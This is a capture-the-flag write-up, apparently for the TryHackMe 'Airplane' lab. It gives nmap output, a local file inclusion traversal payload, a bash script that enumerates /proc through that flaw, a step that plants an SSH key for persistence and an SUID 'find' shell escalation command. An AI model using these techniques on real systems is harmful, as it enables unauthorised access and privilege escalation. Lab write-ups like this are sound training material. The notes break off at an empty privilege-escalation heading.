m
# Airplane

Nmap scan

```shell
# Nmap 7.94SVN scan initiated Mon Jun 10 16:36:29 2024 as: nmap -sCV -p- --min-rate=1000 -T4 -oN scan -vv 10.10.84.134
Nmap scan report for 10.10.84.134
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2024-06-10 16:36:29 WAT for 249s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE=
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8=
|   256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb
6048/tcp open  x11?     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63 Werkzeug/3.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Mon, 10 Jun 2024 15:37:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Mon, 10 Jun 2024 15:37:45 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=6/10%Time=66671DCA%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\
SF:.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2010\x20Jun\x202024\x2015:37:45
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html
SF:\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n
SF:<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x2
SF:0should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20
SF:URL:\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">htt
SF:p://airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\
SF:x20the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x
SF:20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20M
SF:on,\x2010\x20Jun\x202024\x2015:37:51\x20GMT\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Foun
SF:d</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20
SF:not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x2
SF:0URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x
SF:20again\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C
SF://DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://
SF:www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\
SF:x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD
SF:_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20metho
SF:d\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 10 16:40:38 2024 -- 1 IP address (1 host up) scanned in 248.94 seconds
```

Website on port 8000

![[attachments/Pasted image 20240610164552.png]]

Insert domain into `/etc/hosts` file

![[attachments/Pasted image 20240610164642.png]]

![[attachments/Pasted image 20240610164850.png]]

URL looks to be vulnerable to LFI (local file inclusion). The parameter  page is vulnerable

Testing various lfi payloads.

![[attachments/Pasted image 20240610171509.png]]

This works

```
../../../../../../../etc/passwd
```

Checking for common files on a linux system using this vulenrability

![[attachments/Pasted image 20240611100407.png]]

![[attachments/Pasted image 20240611100430.png]]

This file contains information about the TCP sockets in use on the system.

![[attachments/Pasted image 20240611100528.png]]

Port 6048 is actively being used.

next step is to write a script that will search the `/proc` directory for any pid that can be useful

bash script

```bash
#!/bin/bash

# Base URL
BASE_URL="http://airplane.thm:8000/?page=../../../../../../../../proc"

# Output file
OUTPUT_FILE="pid_results.txt"

# Empty the output file if it exists
> $OUTPUT_FILE

# Loop through PIDs 1 to 1000
for PID in {1..1000}; do
    # Construct the URL
    URL="${BASE_URL}/${PID}/cmdline"
    
    # Fetch the content from the URL
    RESPONSE=$(curl -s "$URL")
    
    # Write the result to the output file
    echo "PID: $PID" >> $OUTPUT_FILE
    echo "Response: $RESPONSE" >> $OUTPUT_FILE
    echo "-----------------------------" >> $OUTPUT_FILE
done

echo "Results have been saved to $OUTPUT_FILE"

```

This will just loop through numbers 1 - 1000 and display the contents of `cmdline` which shows the binary running

![[attachments/Pasted image 20240611103622.png]]

Scrolling through the result, we can see the port `6048` and the name airplane which is the name of the room and also the binary being used which is gdbserver.

Searching online for gdbserver exploits

![[attachments/Pasted image 20240611103744.png]]

How to run it
![[attachments/Pasted image 20240611103839.png]]

Generate the payload

![[attachments/Pasted image 20240611103931.png]]

Run the exploit

![[attachments/Pasted image 20240611104112.png]]

Catch a shell

![[attachments/Pasted image 20240611104134.png]]

The user has a `.ssh` directory which is empty

we can generate a private key on our attack machine and send it to the target so we can access via ssh and get a proper shell

![[attachments/Pasted image 20240611104528.png]]

```shell
ssh-keygen -t rsa -b 2048 -f ~/Tryhackme/airplane/id_rsa
```

Rename the public key to authorized_keys and transfer it to the target .ssh directory

![[attachments/Pasted image 20240611104750.png]]

Now ssh as the user hudson

![[attachments/Pasted image 20240611104856.png]]

# Pivoting to the user Carlos

Running linpeas on the target reveals the find binary has SUID set as the user carlos

![[attachments/Pasted image 20240611135419.png]]

Running the following command will give a shell as the user 

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```


![[attachments/Pasted image 20240611135448.png]]

Get the user flag

![[attachments/Pasted image 20240611135538.png]]

# Privilege Escalation

